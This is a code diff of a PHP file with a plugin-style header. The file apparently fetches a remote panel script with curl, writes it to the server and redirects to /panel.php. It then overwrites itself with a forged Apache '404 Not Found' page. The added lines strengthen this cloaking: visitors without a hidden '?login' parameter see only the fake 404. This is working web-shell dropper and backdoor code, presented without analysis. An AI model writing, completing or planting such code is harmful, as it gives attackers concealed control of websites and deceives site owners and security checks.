@@ -4,6 +4,8 @@
  * Version: 1.0.1
  * Author: VinhNoName
 */
+@while(ob_end_clean());
+@ob_start();
 if(isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) $root=$_SERVER['DOCUMENT_ROOT'];
 else if(isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME'])) $root=$_SERVER['SCRIPT_FILENAME'];
 else $root=realpath(dirname(__FILE__));
@@ -29,12 +31,14 @@ curl_close($ch);
 fclose($fp);
 unset($ch);
 unset($fp);
+$_nf='<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /index.php was not found on this server.</p><hr><address>Apache/2.2.15 Server at '.$_SERVER['HTTP_HOST'].' Port 80</address></body></html>';
 if(strpos(file_get_contents($panel),'<?php')!==false){
 header('Location: /panel.php');
 echo '<script>location.href="/panel.php";</script>';
-file_put_contents(__FILE__,'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /index.php was not found on this server.</p><hr><address>Apache/2.2.15 Server at '.$_SERVER['HTTP_HOST'].' Port 80</address></body></html>');
+file_put_contents(__FILE__,$_nf);
 exit;
 }}
+if(!isset($_GET['login'])) exit($_nf);
 ?><html>
 <head>
 <title>Login</title>
@@ -52,3 +56,4 @@ PASSWORD<br />
 </div>
 </body>
 </html>
+<?php exit(); ?>
